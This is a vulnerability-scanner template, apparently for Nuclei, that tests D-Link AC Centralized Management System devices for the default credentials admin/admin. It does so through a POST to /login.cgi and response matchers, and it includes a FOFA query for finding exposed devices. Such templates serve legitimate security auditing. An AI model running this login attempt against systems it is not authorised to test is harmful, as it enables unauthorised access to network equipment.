id: dlink-centralized-default-login

info:
  name: D-Link AC Centralized Management System - Default Login
  author: SleepingBag945
  severity: high
  description: |
    D-Link AC Centralized Management System default login credentials were discovered.
  classification:
    cpe: cpe:2.3:a:dlink:dlink:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="AC集中管理平台" && body="D-Link路由器管理页"
    vendor: dlink
    product: dlink
  tags: default-login,dlink,vuln

http:
  - raw:
      - |
        POST /login.cgi  HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        user={{username}}&password={{password}}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: dsl
        name: dlink
        cpe: cpe:2.3:a:dlink:dlink:*:*:*:*:*:*:*:*
        dsl:
          - 'status_code_1 == 200 && !contains(body_1,"flag=0")'
        condition: and

      - type: word
        name: dlink-2
        cpe: cpe:2.3:a:dlink:dlink:*:*:*:*:*:*:*:*
        part: header
        words:
          - "Set-Cookie"
          - "ac_userid"
        condition: and

      - type: word
        name: dlink-3
        cpe: cpe:2.3:a:dlink:dlink:*:*:*:*:*:*:*:*
        part: body
        words:
          - "window.open"
        condition: and
